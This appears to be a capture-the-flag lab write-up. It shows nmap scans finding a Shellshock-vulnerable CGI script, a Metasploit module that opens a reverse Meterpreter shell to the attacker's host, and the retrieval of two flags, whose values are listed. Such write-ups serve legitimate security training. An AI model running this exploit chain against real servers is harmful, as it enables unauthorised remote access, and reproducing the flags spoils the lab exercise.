# Target Info
*Domain*: `target1.ine.local`
*IP*: `192.63.116.3`

# Flags
1) *flag1*: `FLAG1_f5b44ed9212846ce9a13dceb7e7f0979`
2) *flag2* : `bf1a74fda9234e4b86b6b07419613536`
# Enumeration
## Port Scan
```shell
- sudo nmap --min-rate 10000 -p- -sV target1.ine.local 
	
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.6 ((Unix))
	MAC Address: 02:42:C0:3F:74:03 (Unknown)
```

## Service Scan
```shell
- sudo nmap -sS -sV -A -T4 -oX target1 target1.ine.local

	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.6 ((Unix))
	|_http-title: Browser Detector
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Apache/2.4.6 (Unix)
	MAC Address: 02:42:C0:3F:74:03 (Unknown)
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.8
	Network Distance: 1 hop

```

### ShellShocl Vuln Check
```shell 
- sudo nmap -sV -p80 --script http-shellshock --script-args='uri=/browser.cgi' target1.ine.local

	 http-shellshock: 
	|   VULNERABLE:
	|   HTTP Shellshock vulnerability
	|     State: VULNERABLE (Exploitable)
	|     IDs:  CVE:CVE-2014-6271
	|       This web application might be affected by the vulnerability known
	|       as Shellshock. It seems the server is executing commands injected
	|       via malicious HTTP headers.
```

# Exploitation
## exploiting shellshock
```shell
# msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set lhost 192.63.116.2
set rhosts target1.ine.local
set targeturi /browser.cgi
run
## got meterpreter session
[*] Started reverse TCP handler on 192.63.116.2:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.63.116.3
[*] Meterpreter session 1 opened (192.63.116.2:4444 -> 192.63.116.3:50120) at 2025-05-13 01:41:29 +0530

# session
meterpreter > sysinfo
Computer     : target1.ine.local
OS           : Ubuntu 14.04 (Linux 6.8.0-40-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

# Flag1
shell 
cd /flag.txt
> FLAG1_f5b44ed9212846ce9a13dceb7e7f0979

# flag2
ls -la /opt/apache/htdocs/
cat /opt/apache/htdocs/.flag.txt
FLAG2_bf1a74fda9234e4b86b6b07419613536
```